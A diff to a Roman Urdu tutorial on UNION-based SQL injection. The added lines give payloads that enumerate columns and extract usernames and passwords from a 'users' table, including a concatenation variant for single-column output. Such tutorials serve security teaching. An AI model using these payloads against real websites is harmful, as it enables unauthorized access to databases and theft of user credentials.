@@ -60,6 +60,19 @@ Aik or baat yeh ky agar yeh command work na kare too phir column no change kiya 
 
 ` ' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--`
 
-Yeh command table name find krny ky baad daali jati hai iss command sy column name ka pata chalta hai.
+Yeh command table name find krny ky baad daali jati hai iss command sy column name ka pata chalta hai. Jab inn dono ka pata chal jaye too final command aisy banti hai
+
+` ' UNION SELECT username, password FROM users--`
 
 ---
+
+### Value Concatenation 
+
+` ' UNION SELECT username || '~' || password FROM users--`
+
+Yeh command taab use hoti hai jab table main sirf aik column hoo or iusi sy dono cheezein nikalwani hon too phir hum iss tarah username or password dono ko combine krty hain iss process ko concatenation kehty hain.
+
+---
+
+Yeh sub commands hi use hoti hain SQL Injection main information gathering ky liye or yeh haar database ky liye thori bht different hoo skti hain.
+
